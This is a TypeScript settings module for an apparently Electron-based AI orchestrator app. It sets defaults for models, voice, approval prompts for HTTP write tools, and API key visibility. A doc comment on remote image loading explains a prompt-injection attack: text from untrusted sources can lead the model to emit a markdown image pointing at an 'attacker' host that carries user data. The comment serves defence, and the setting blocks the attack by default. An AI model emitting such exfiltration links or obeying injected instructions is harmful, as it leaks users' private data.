export const DEFAULT_ORCHESTRATOR_MODEL = "gpt-4.1-mini";
export const DEFAULT_VOICE_TRANSCRIPTION_MODEL = "whisper-1";
export const DEFAULT_VOICE_TTS_MODEL = "tts-1";
export const DEFAULT_VOICE_TTS_VOICE = "alloy";
export const VOICE_TTS_VOICE_OPTIONS = ["alloy", "echo", "fable", "onyx", "nova", "shimmer"] as const;
export const DEFAULT_AGENT_RUN_TIMEOUT_SECONDS = 60;
export const DEFAULT_CHAT_HISTORY_MESSAGE_LIMIT = 20;
export const DEFAULT_BG_MUSIC_VOLUME = 0.1;
export const DEFAULT_SYSTEM_STATS_POLL_INTERVAL_MS = 3000;
/** Number of pre-rendered variations available per SFX event (public/audio/sfx/<event>/v1..v5.wav). */
export const SOUND_FX_VARIANT_COUNT = 5;

export const TOOL_APPROVAL_DISPLAY_OPTIONS = ["modal", "inline"] as const;
export type ToolApprovalDisplay = (typeof TOOL_APPROVAL_DISPLAY_OPTIONS)[number];

export interface AgentsSettings {
  chatApiKey: string;
  chatApiUrl: string;
  voiceApiKey: string;
  voiceApiUrl: string;
  voiceInputEnabled: boolean;
  typeAnywhereEnabled: boolean;
  onboardingDone: boolean;
  tourCompleted: boolean;
  agentName: string;
  agentDescription: string;
  /** User override for the orchestrator's system prompt; empty string means "use the built-in orchestrator.md". */
  orchestratorPromptOverride: string;
  userName: string;
  orchestratorModel: string;
  orchestratorEnabled: boolean;
  orchestratorMcpServerIds: string[];
  orchestratorConnectorIds: string[];
  orchestratorHttpToolCollectionIds: string[];
  /** Which HTTP methods pause the run and ask before they execute. Global on purpose —
   * approval is a posture ("I want to be asked before anything is deleted"), not a
   * property of one endpoint. Reads (GET/HEAD) never ask. */
  httpToolApprovalPost: boolean;
  httpToolApprovalPutPatch: boolean;
  httpToolApprovalDelete: boolean;
  /** How an approval request is presented: a blocking modal, or a card inline in the
   * chat log. */
  toolApprovalDisplay: ToolApprovalDisplay;
  voiceTranscriptionModel: string;
  voiceOutputEnabled: boolean;
  soundFxEnabled: boolean;
  voiceTtsModel: string;
  locationEnabled: boolean;
  /** Whether a remote image in a reply loads on sight, or waits for a click.
   *
   * Off by default, and the default is the security control. Replies are built from text
   * the app does not author — web search results, knowledge base files, MCP and HTTP tool
   * output, Gmail/Drive/Calendar. Any of those can carry an instruction that makes the model
   * emit `![](https://attacker/?d=<your data>)`, and an image that loads on sight sends that
   * request before anyone has read the reply. Requiring a click means data cannot leave
   * without a person agreeing, and the URL is on screen to be judged first.
   *
   * Local `data:` images are unaffected either way — they carry their own bytes and reach
   * no network. */
  remoteImagesAutoLoad: boolean;
  bgMusicEnabled: boolean;
  voiceTtsVoice: string;
  agentRunTimeoutSeconds: number;
  chatHistoryMessageLimit: number;
  bgMusicVolume: number;
  systemStatsPollIntervalMs: number;
  soundVariantSend: number;
  soundVariantReceive: number;
  soundVariantHandoff: number;
  soundVariantComplete: number;
  soundVariantStartup: number;
  soundVariantAgentCreated: number;
  soundVariantAgentDeleted: number;
}

export const DEFAULT_SETTINGS: AgentsSettings = {
  chatApiKey: "",
  chatApiUrl: "",
  voiceApiKey: "",
  voiceApiUrl: "",
  voiceInputEnabled: true,
  typeAnywhereEnabled: true,
  onboardingDone: false,
  tourCompleted: false,
  agentName: "Orbit",
  agentDescription: "Your personal AI orchestrator.",
  orchestratorPromptOverride: "",
  userName: "",
  orchestratorModel: DEFAULT_ORCHESTRATOR_MODEL,
  orchestratorEnabled: true,
  orchestratorMcpServerIds: [],
  orchestratorConnectorIds: [],
  orchestratorHttpToolCollectionIds: [],
  // All three default on: a fresh install asks before anything is written, and the user
  // relaxes what they don't want. The safe direction to be wrong in.
  httpToolApprovalPost: true,
  httpToolApprovalPutPatch: true,
  httpToolApprovalDelete: true,
  // Modal by default — it is the behaviour that already shipped, and a blocked run whose
  // prompt goes unnoticed reads as a hung app. One setting flips it to the inline card.
  toolApprovalDisplay: "modal",
  voiceTranscriptionModel: DEFAULT_VOICE_TRANSCRIPTION_MODEL,
  voiceOutputEnabled: true,
  soundFxEnabled: true,
  voiceTtsModel: DEFAULT_VOICE_TTS_MODEL,
  locationEnabled: false,
  remoteImagesAutoLoad: false,
  bgMusicEnabled: false,
  voiceTtsVoice: DEFAULT_VOICE_TTS_VOICE,
  agentRunTimeoutSeconds: DEFAULT_AGENT_RUN_TIMEOUT_SECONDS,
  chatHistoryMessageLimit: DEFAULT_CHAT_HISTORY_MESSAGE_LIMIT,
  bgMusicVolume: DEFAULT_BG_MUSIC_VOLUME,
  systemStatsPollIntervalMs: DEFAULT_SYSTEM_STATS_POLL_INTERVAL_MS,
  soundVariantSend: 1,
  soundVariantReceive: 1,
  soundVariantHandoff: 1,
  soundVariantComplete: 1,
  soundVariantStartup: 1,
  soundVariantAgentCreated: 1,
  soundVariantAgentDeleted: 1,
};

/**
 * What the renderer actually holds: every setting, plus the two booleans that stand in for the
 * API keys.
 *
 * `settings:get` does not return the keys — see getVisibleSettings in electron/main/ipc/settings.ts
 * — so `chatApiKey`/`voiceApiKey` are always "" here. They stay on the type because a *patch*
 * still carries them: writes go renderer → main normally, it is only the return trip that stops.
 */
export type SettingsView = AgentsSettings & {
  chatApiKeySet: boolean;
  voiceApiKeySet: boolean;
};

/** Kept out of DEFAULT_SETTINGS on purpose: that object mirrors the persisted settings exactly,
 * and `settingsDefaults.test.ts` asserts it matches main's SETTING_DEFAULTS key for key. These
 * two are derived signals, not settings. */
const DEFAULT_KEY_FLAGS = { chatApiKeySet: false, voiceApiKeySet: false };

/** Merges a raw settings blob (from `agentsAPI.settings.get()`, shape not guaranteed) onto defaults. */
export function mergeWithDefaults(raw: Record<string, unknown>): SettingsView {
  return { ...DEFAULT_SETTINGS, ...DEFAULT_KEY_FLAGS, ...(raw as Partial<SettingsView>) };
}
